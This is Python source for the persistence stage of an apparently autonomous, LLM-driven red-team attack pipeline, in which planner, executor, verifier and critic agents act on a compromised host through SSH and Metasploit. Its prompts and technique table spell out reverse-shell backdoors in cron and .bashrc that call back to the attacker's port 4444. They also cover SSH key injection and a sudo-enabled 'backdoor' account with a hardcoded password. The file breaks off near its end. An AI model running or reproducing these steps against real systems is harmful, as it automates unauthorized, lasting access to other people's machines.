"""
Persistence Subgraph — Install and verify a persistence mechanism on a compromised target.

Third stage of the killchain: recon → initial_access → **persistence** → privesc → impact.
Produces structured PersistenceFindings for downstream consumption.

Architecture:
    Planner ⟷ RAG → Executor ⟷ SSH/MSF → Verifier ⟷ SSH → Critic
                                                                 ↓
                                                          PASS → END
                                                          FAIL → Planner (max 5)

Usage:
    python stages/persistence.py                    # Interactive standalone mode
    python stages/persistence.py --graph            # Print graph topology
    from stages.persistence import run_persistence  # Programmatic subgraph call
"""

import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import PersistenceFindings
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session, tool_session_command

# =============================================================================
# CONSTANTS
# =============================================================================

MAX_PERSISTENCE_RETRIES = 5
MAX_PLANNER_TOOL_CALLS = 3
MAX_EXECUTOR_TOOL_CALLS = 10
MAX_VERIFIER_TOOL_CALLS = 5

# =============================================================================
# STATE
# =============================================================================

class PersistenceState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    session_id: str
    session_type: str          # "command_shell" | "meterpreter"
    access_level: str          # "user" | "root"
    objective: str
    persistence_plan: str      # Planner's chosen technique + steps
    install_result: str        # Executor's summary of what was installed
    verification_result: str   # Verifier's summary of verification test
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL"

# =============================================================================
# TOOL DEFINITIONS
# =============================================================================

@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the KALI ATTACKER machine via SSH.
    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
    - ssh-keygen, starting listeners, SSH login tests, receiving files.

    To run commands on the TARGET, use tool_session_command instead.

    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    Use non-interactive flags (e.g., -y).
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Persistence Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the Metasploit CONSOLE.
    Use ONLY for MSF console commands: listing sessions, background, use, set, run, exploit.

    Do NOT use this for running commands on the target — use tool_session_command instead.
    """
    try:
        return msf_session.send_command(command)
    except Exception as e:
        return f"RPC Error: {str(e)}"


# Tool sets
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
VERIFIER_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

PLANNER_PROMPT = f"""You are a Persistence Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. TARGET IP, SESSION ID, SESSION TYPE, ACCESS LEVEL — details of the active session
2. OBJECTIVE — the operator's overall goal
3. RECOMMENDED TECHNIQUES — pre-verified techniques for the current access level and session type
4. CRITIC FEEDBACK — if retrying, what went wrong last time

Your job: choose ONE persistence technique and produce a step-by-step installation plan.

**TOOL CLARITY — 3 tools, 3 different targets:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for all target commands: whoami, crontab, echo, mkdir, chmod, etc.)
- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, starting listeners, SSH login tests)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, use, set, run)

**TECHNIQUE SELECTION:**
PRIORITIZE the RECOMMENDED TECHNIQUES provided in the context — these are pre-verified and reliable.
Only query the knowledge base if ALL recommended techniques have already failed or if you need
a novel technique not in the list.

**You have access to `query_knowledge_base`** — a RAG tool for searching post-exploitation techniques.
Use it as a FALLBACK only (max {MAX_PLANNER_TOOL_CALLS} queries). Focus queries on specific novel
techniques, NOT generic "persistence" searches.

**SESSION TYPE AWARENESS:**
- **command_shell**: Raw shell only. All persistence must use standard Linux commands (echo, crontab, mkdir, chmod, etc.). No MSF post modules, no `upload`, no `run persistence`.
- **meterpreter**: Full MSF post-exploitation available. Can use `upload`, `run`, post modules.

**Output format (final answer — no more tool calls):**

PERSISTENCE PLAN:
TECHNIQUE: <method name, e.g., "cron_job">
ACCESS_LEVEL: <current access level>
SESSION_TYPE: <command_shell or meterpreter>
STEPS:
1. <exact command or action, specifying which tool to use>
2. <exact command or action>
...

VERIFICATION_PLAN:
1. <how to verify the mechanism works>
2. <expected output that confirms success>

**On retry:**
- Read the critic's feedback carefully
- Choose a DIFFERENT technique from the recommended list
- Do NOT repeat a technique that already failed
"""

EXECUTOR_PROMPT = f"""You are a Persistence Executor for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools — each runs in a DIFFERENT place:

**TOOL CLARITY:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL target commands)
- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, listeners, SSH login tests)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, etc. — NOT for target commands)

**CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.

- **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).

**SESSION TYPE AWARENESS:**
- **command_shell**: Raw shell. Use standard Linux commands only. No `upload`, no `run`, no post modules.
- **meterpreter**: Full MSF post-exploitation. Can use `upload`, `run persistence`, post modules, etc.
- Match your commands to the session type. Do NOT try meterpreter commands on a command_shell.

**Your job:** Execute the persistence installation plan step by step.

**Rules:**
1. Execute commands ONE AT A TIME via tools
2. READ each output carefully before proceeding
3. If a command fails, adapt (e.g., create directories, fix permissions)
4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands total
5. Do NOT try to create objective files (like i_got_in.txt) — that is the Impact stage's job. Focus ONLY on persistence.
6. Do NOT use `crontab -e` (interactive). Use `echo '...' | crontab -` instead.

**Step-by-step example for cron job persistence (session 3):**

1. tool_session_command("3", "whoami")                          ← confirm access level ON TARGET
2. tool_session_command("3", "echo \\"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1'\\" | crontab -")
3. tool_session_command("3", "crontab -l")                      ← verify cron is set ON TARGET

**Step-by-step example for SSH key injection (session 3):**

1. tool_linux_terminal("ssh-keygen -t rsa -f /tmp/persist_key -N \\"\\"")   ← generate key on KALI
2. tool_linux_terminal("cat /tmp/persist_key.pub")                           ← read public key on KALI
3. tool_session_command("3", "mkdir -p ~/.ssh && chmod 700 ~/.ssh")          ← create dir ON TARGET
4. tool_session_command("3", "echo '<pubkey contents>' >> ~/.ssh/authorized_keys")  ← inject key ON TARGET
5. tool_session_command("3", "chmod 600 ~/.ssh/authorized_keys")             ← set perms ON TARGET

**When done, provide a text summary of what was installed and where.**
Do not make any more tool calls after providing your summary.
"""

VERIFIER_PROMPT = f"""You are a Persistence Verifier for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools:
- `tool_session_command(session_id, command)` — run commands ON THE TARGET (crontab -l, systemctl, grep, etc.)
- `tool_linux_terminal(command)` — run commands on KALI (SSH login tests, checking listeners)
- `tool_metasploit_rpc(command)` — MSF console only (listing sessions, etc.)

**Your job:** Verify that the installed persistence mechanism actually works.

**CRITICAL — WHERE TO RUN VERIFICATION:**
- To check things ON THE TARGET (crontab -l, systemctl, /etc/passwd), use `tool_session_command`.
- To check things FROM KALI (SSH login test, listener check), use `tool_linux_terminal`.
- Do NOT use `tool_metasploit_rpc` for running commands on the target.

**Verification strategies by technique:**

SSH Key:
- FROM KALI: `tool_linux_terminal("ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami")`
- Expected: returns the username without password prompt

Cron Job:
- ON TARGET: `tool_session_command("<session_id>", "crontab -l")`
- Expected: see the reverse shell cron entry

Systemd Service:
- ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
- Expected: "enabled"

User Account:
- FROM KALI: `tool_linux_terminal("sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target> whoami")`
- Or ON TARGET: `tool_session_command("<session_id>", "grep <user> /etc/passwd")`

**Rules:**
1. Run verification commands ONE AT A TIME
2. Do NOT run more than {MAX_VERIFIER_TOOL_CALLS} commands
3. Provide a text summary with clear PASS/FAIL assessment

**Output (final text — no more tool calls):**

VERIFICATION RESULT:
METHOD: <technique verified>
STATUS: <WORKING | NOT WORKING>
EVIDENCE: <what output confirmed it>
"""

CRITIC_PROMPT = f"""You are a Persistence Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether a persistence mechanism was successfully installed AND verified.

**You receive:**
- The persistence plan (technique chosen)
- The executor's installation summary
- The verifier's test results
- The loop step count

**Evaluation criteria:**

1. **Mechanism installed?** — Did the executor report successful installation?
2. **Mechanism verified?** — Did the verifier confirm the mechanism works?
   - SSH key: verified login works without password
   - Cron: verified job is listed and/or fires
   - Service: verified service is active/enabled
   - User: verified new user can log in
3. **Both required for PASS** — installation without verification is NOT a PASS

**Verdict:**
- **PASS** if: mechanism was installed AND verified working
- **FAIL** if: installation failed, OR verification failed or was not performed

**Output format:**

VERDICT: <PASS|FAIL>

METHOD: <technique that was attempted>

ASSESSMENT: <2-3 sentence summary>

FEEDBACK: <if FAIL — specific instructions for retry.
           Suggest a DIFFERENT technique if the current one keeps failing.
           Be specific: name the technique and key commands.>
"""

# =============================================================================
# MESSAGE HELPERS
# =============================================================================

def _sanitize_message_window(messages: list) -> list:
    """Ensure message ordering is valid for the OpenAI API.

    Handles two failure modes:
    1. Orphaned ToolMessage — no preceding AIMessage with tool_calls → drop it
    2. AIMessage with tool_calls but missing ToolMessage responses → add dummy responses

    Both cause OpenAI 400 errors and crash the subgraph.
    """
    sanitized = []
    i = 0
    while i < len(messages):
        msg = messages[i]
        if isinstance(msg, AIMessage) and getattr(msg, 'tool_calls', None):
            # AI message with tool_calls: collect all following ToolMessages
            sanitized.append(msg)
            expected_ids = {tc['id'] for tc in msg.tool_calls}
            found_ids = set()
            j = i + 1
            while j < len(messages) and isinstance(messages[j], ToolMessage):
                if messages[j].tool_call_id in expected_ids:
                    sanitized.append(messages[j])
                    found_ids.add(messages[j].tool_call_id)
                j += 1
            # Add dummy responses for any missing tool_call_ids
            for missing_id in expected_ids - found_ids:
                sanitized.append(ToolMessage(
                    content="[No output captured]",
                    tool_call_id=missing_id,
                ))
            i = j
        elif isinstance(msg, ToolMessage):
            # Orphaned ToolMessage (no preceding AI with tool_calls) — skip
            i += 1
        else:
            sanitized.append(msg)
            i += 1
    return sanitized

def _get_recommended_techniques(access_level: str, session_type: str, session_id: str) -> str:
    """Return deterministic persistence technique recommendations based on context.

    These are pre-verified, reliable techniques that the planner should try BEFORE
    falling back to RAG. Keeps RAG available for novel techniques when these are exhausted.
    """
    techniques = []

    if access_level == "root":
        techniques.append({
            "name": "Cron job backdoor",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "whoami")  # confirm root access on TARGET',
                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
            ],
            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
            "notes": "Most reliable. Works on all Linux. Fires every minute.",
        })
        techniques.append({
            "name": "SSH authorized_keys injection",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
                f'tool_session_command({session_id}, "mkdir -p /root/.ssh && chmod 700 /root/.ssh")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> /root/.ssh/authorized_keys")  # on TARGET',
                f'tool_session_command({session_id}, "chmod 600 /root/.ssh/authorized_keys")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no root@<target> whoami",
            "notes": "Reliable. Requires SSH service on target (port 22).",
        })
        techniques.append({
            "name": "New user account with SSH",
            "reliability": "MEDIUM",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "useradd -m -s /bin/bash -G sudo backdoor")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'backdoor:backdoor123\' | chpasswd")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: sshpass -p 'backdoor123' ssh -o StrictHostKeyChecking=no backdoor@<target> whoami",
            "notes": "Creates a new login. Visible in /etc/passwd — less stealthy.",
        })
    else:
        # user-level access
        techniques.append({
            "name": "User cron job backdoor",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "whoami")  # confirm user on TARGET',
                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
            ],
            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
            "notes": "Works without root. User-level cron.",
        })
        techniques.append({
            "name": "SSH authorized_keys injection (user)",
            "reliability": "HIGH",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
                f'tool_session_command({session_id}, "mkdir -p ~/.ssh && chmod 700 ~/.ssh")  # on TARGET',
                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> ~/.ssh/authorized_keys")  # on TARGET',
                f'tool_session_command({session_id}, "chmod 600 ~/.ssh/authorized_keys")  # on TARGET',
            ],
            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami",
            "notes": "Requires SSH service on target.",
        })
        techniques.append({
            "name": "Bash profile backdoor",
            "reliability": "MEDIUM",
            "session_types": ["command_shell", "meterpreter"],
            "steps": [
                f'tool_session_command({session_id}, "echo \'/bin/bash -c \\"bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\\" &\' >> ~/.bashrc")',
                f'tool_session_command({session_id}, "cat ~/.bashrc | tail -3")  # verify on TARGET',
            ],
            "verification": "tool_session_command: cat ~/.bashrc shows the reverse shell line appended",
            "notes": "Fires on next user login. Less reliable than cron.",
        })

    # Format for injection into context
    output = "\n**RECOMMENDED TECHNIQUES (pre-verified, prioritize these):**\n"
    for i, t in enumerate(techniques, 1):
        compatible = "YES" if session_type in t["session_types"] else "NO (wrong session type)"
        output += f"\n{i}. **{t['name']}** — Reliability: {t['reliability']}, Compatible: {compatible}\n"
        output += f"   Steps:\n"
        for step in t["steps"]:
            output += f"     - {step}\n"
        output += f"   Verification: {t['verification']}\n"
        output += f"   Notes: {t['notes']}\n"

    output += "\nUse these FIRST. Only query the knowledge base if all recommended techniques have failed.\n"
    return output


# =============================================================================
# NODE IMPLEMENTATIONS
# =============================================================================

def planner_node(state: PersistenceState) -> dict:
    """Choose persistence technique. ReAct loop with RAG."""
    print_colored("\n[Persistence Planner] Selecting technique...", Colors.HEADER)

    messages = state["messages"]
    target_ip = state.get("target_ip", "")
    session_id = state.get("session_id", "")
    session_type = state.get("session_type", "")
    access_level = state.get("access_level", "user")

    # Count planner tool calls in current cycle
    planner_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage):
            break
        if isinstance(msg, ToolMessage):
            planner_tool_count += 1

    if planner_tool_count == 0:
        # First call: build context with deterministic technique recommendations
        context = (
            f"TARGET: {target_ip}\n"
            f"SESSION: {session_type} (ID: {session_id})\n"
            f"ACCESS LEVEL: {access_level}\n"
            f"OBJECTIVE: {state.get('objective', '')}\n"
        )

        # Inject deterministic technique recommendations
        context += _get_recommended_techniques(access_level, session_type, session_id)

        # Include critic feedback if retrying
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
                break
        planner_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop — include from last HumanMessage, sanitized
        cycle_start = 0
        for i in range(len(messages) - 1, -1, -1):
            if isinstance(messages[i], HumanMessage):
                cycle_start = i
                break
        planner_msgs = _sanitize_message_window(list(messages[cycle_start:]))

    # Safety valve
    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[Persistence Planner] RAG cap reached ({planner_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content=(
                "Max queries reached. Produce your final persistence plan now."
            ))],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[Persistence Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)
        return {
            "messages": [AIMessage(content=f"[Persistence Planner] {response.content}")],
            "persistence_plan": response.content,
        }

    return {"messages": [response]}


def executor_node(state: PersistenceState) -> dict:
    """Install persistence mechanism. ReAct loop with SSH/MSF tools."""
    messages = state["messages"]
    print_colored("\n[Persistence Executor] Installing mechanism...", Colors.HEADER)

    # Count tool calls since planner output
    executor_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build message window from planner output
    executor_msgs = []
    capturing = False
    for msg in messages:
        if isinstance(msg, AIMessage) and "[Persistence Planner]" in (msg.content or ""):
            capturing = True
        if capturing:
            executor_msgs.append(msg)
    if not executor_msgs:
        executor_msgs = [messages[-1]]
    executor_msgs = _sanitize_message_window(executor_msgs)

    # Safety valve
    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[Persistence Executor] Tool cap ({executor_tool_count}). Forcing summary.", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                "Max tool calls reached. Summarize what was installed so far."
            ))],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    # Capture text summary into install_result
    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "install_result": response.content,
        }

    return {"messages": [response]}


def verifier_node(state: PersistenceState) -> dict:
    """Verify persistence mechanism works. ReAct loop with SSH."""
    messages = state["messages"]
    install_result = state.get("install_result", "")
    persistence_plan = state.get("persistence_plan", "")

    print_colored("\n[Persistence Verifier] Testing mechanism...", Colors.HEADER)

    # Count verifier tool calls
    verifier_tool_count = 0
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
            # Hit executor's summary = start of verifier cycle
            if "[Persistence Executor]" in msg.content or msg.content == install_result:
                break
        if isinstance(msg, ToolMessage):
            verifier_tool_count += 1

    # Build context for verifier
    if verifier_tool_count == 0:
        context = (
            f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
            f"INSTALLATION RESULT:\n{install_result}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"\nVerify the mechanism works by testing it now."
        )
        verifier_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct loop — use recent messages, sanitized to avoid orphaned ToolMessages
        verifier_msgs = _sanitize_message_window(list(messages[-min(10, len(messages)):]))

    # Safety valve
    if verifier_tool_count >= MAX_VERIFIER_TOOL_CALLS:
        print_colored(f"[Persistence Verifier] Tool cap ({verifier_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=verifier_msgs + [HumanMessage(content=(
                "Max verification commands reached. Provide your verification assessment now."
            ))],
            system_prompt=VERIFIER_PROMPT
        )
    else:
        response = call_llm(
            messages=verifier_msgs,
            system_prompt=VERIFIER_PROMPT,
            tools=VERIFIER_TOOLS
        )

    # Capture text summary
    if response.content and not response.tool_calls:
        return {
            "messages": [response],
            "verification_result": response.content,
        }

    return {"messages": [response]}


def critic_node(state: PersistenceState) -> dict:
    """Evaluate installation + verification."""
    messages = state["messages"]
    current_step = state.get("loop_step", 0)

    print_colored("\n[Persistence Critic] Evaluating...", Colors.HEADER)

    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    evidence = (
        f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
        f"INSTALLATION RESULT:\n{install_result}\n\n"
        f"VERIFICATION RESULT:\n{verification_result}\n\n"
        f"LOOP STEP: {current_step} of {MAX_PERSISTENCE_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = response.content.strip()
    print_colored(f"[Persistence Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1
    upper = verdict_text.upper()
    if "VERDICT: PASS" in upper or ("PASS" in upper and "FAIL" not in upper):
        verdict = "PASS"
    else:
        verdict = "FAIL"

    print_colored(f"[Persistence Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Persistence Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "FAIL",
        }


# =============================================================================
# TOOL NODES
# =============================================================================

def planner_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

def verifier_tools_node(state: PersistenceState) -> dict:
    tool_node = ToolNode(VERIFIER_TOOLS)
    return tool_node.invoke(state)

# =============================================================================
# ROUTING LOGIC
# =============================================================================

def route_after_planner(state: PersistenceState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: PersistenceState) -> Literal["executor_tools", "verifier"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and "[Persistence Planner]" in (m.content or ""):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "verifier"
        return "executor_tools"
    return "verifier"


def route_after_verifier(state: PersistenceState) -> Literal["verifier_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, AIMessage) and not m.tool_calls and m.content:
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_VERIFIER_TOOL_CALLS:
            return "critic"
        return "verifier_tools"
    return "critic"


def route_after_critic(state: PersistenceState) -> Literal["planner", "__end__"]:
    time.sleep(2)  # Rate limiting
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_PERSISTENCE_RETRIES:
        print_colored("--- MAX PERSISTENCE RETRIES REACHED ---", Colors.FAIL)
        return END
    verdict = state.get("critic_verdict", "FAIL")
    if verdict == "PASS":
        return END
    return "planner"

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    workflow = StateGraph(PersistenceState)

    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("verifier", verifier_node)
    workflow.add_node("verifier_tools", verifier_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("planner")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "verifier": "verifier"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Verifier ReAct loop
    workflow.add_conditional_edges(
        "verifier", route_after_verifier,
        {"verifier_tools": "verifier_tools", "critic": "critic"}
    )
    workflow.add_edge("verifier_tools", "verifier")

    # Critic routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {"planner": "planner", END: END}
    )

    return workflow

# =============================================================================
# FINDINGS EXTRACTION
# =============================================================================

def _extract_persistence_findings(state: dict) -> PersistenceFindings:
    critic_verdict = state.get("critic_verdict", "")
    persistence_plan = state.get("persistence_plan", "")
    install_result = state.get("install_result", "")
    verification_result = state.get("verification_result", "")

    success = critic_verdict == "PASS"

    # Extract method from plan text
    method = "unknown"
    plan_lower = persistence_plan.lower()
    if "ssh" in plan_lower and "key" in plan_lower:
        method = "ssh_key"
    elif "cron" in plan_lower:
        method = "cron_job"
    elif "systemd" in plan_lower or "service" in plan_lower:
        method = "systemd_service"
    elif "user" in plan_lower and ("account" in plan_lower or "useradd" in plan_lower):
        method = "user_account"
    elif "bashrc" in plan_lower or "profile" in plan_lower:
        method = "shell_profile"

    # Build details
    details = f"Plan: {persistence_plan[:200]}\nInstall: {install_result[:200]}\nVerify: {verification_result[:200]}"

    # Build summary
    if success:
        summary = f"Persistence established via {method}. Verified working."
    else:
        summary = f"Persistence failed. Attempted: {method}. {verification_result[:100]}"

    return PersistenceFindings(
        success=success,
        method=method,
        details=details,
        summary=summary,
    )

# =============================================================================
# ENTRY POINT
# =============================================================================

def run_persistence(
    target_ip: str,
    session_id: str,
    session_type: str,
    access_level: str,
    objective: str = "",
    thread_id: str = None,
    recursion_limit: int = 100,
) -> PersistenceFindings:
    import uuid

    if thread_id is None:
        thread_id = f"persist_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=(
            f"Install persistence on {target_ip}.\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Access level: {access_level}\n"
            f"Objective: {objective}"
        ))],
        "target_ip": target_ip,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "objective": objective,
        "persistence_plan": "",
        "install_result": "",
        "verification_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_persistence] Starting persistence subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Access: {access_level}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    try:
        for event in app.stream(initial_state, config=config):
            for key, value in event.items():
                if not value or "messages" not in value:
                    continue
                msgs = value["messages"]
                if not isinstance(msgs, list):
                    msgs = [msgs]
                for msg in msgs:
                    if not isinstance(msg, BaseMessage) or not msg.content:
                        continue
                    if "CRITIC FEEDBACK" in msg.content:
                        print_colored(f"\n{msg.content}", Colors.FAIL)
                    elif isinstance(msg, ToolMessage):
                        display = msg.content[:500]
                        if len(msg.content) > 500:
                            display += "... [truncated]"
                        print(f"\n[Tool Output]: {display}")
                    elif isinstance(msg, AIMessage):
                        content = msg.content
                        if "[Persistence Planner]" in content:
                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                        elif "[Persistence Critic]" in content:
                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                            print_colored(f"\n{content[:400]}", color)
                        elif "[Persistence Verifier]" in content or "[Persistence Executor]" in content:
                            print_colored(f"\n{content[:400]}", Colors.WARNING)
                        else:
                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                    if hasattr(msg, "tool_calls") and msg.tool_calls:
                        for t in msg.tool_calls:
                            print_colored(
                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                Colors.OKCYAN
                            )
    except Exception as e:
        print_colored(f"\n[Persistence] Subgraph crashed: {e}", Colors.FAIL)
        print_colored("[Persistence] Returning graceful failure.", Colors.WARNING)
        return PersistenceFindings(
            success=False,
            method="error",
            details=f"Crash: {str(e)[:200]}",
            summary=f"Persistence crashed: {str(e)[:200]}",
        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_persistence_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_persistence] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
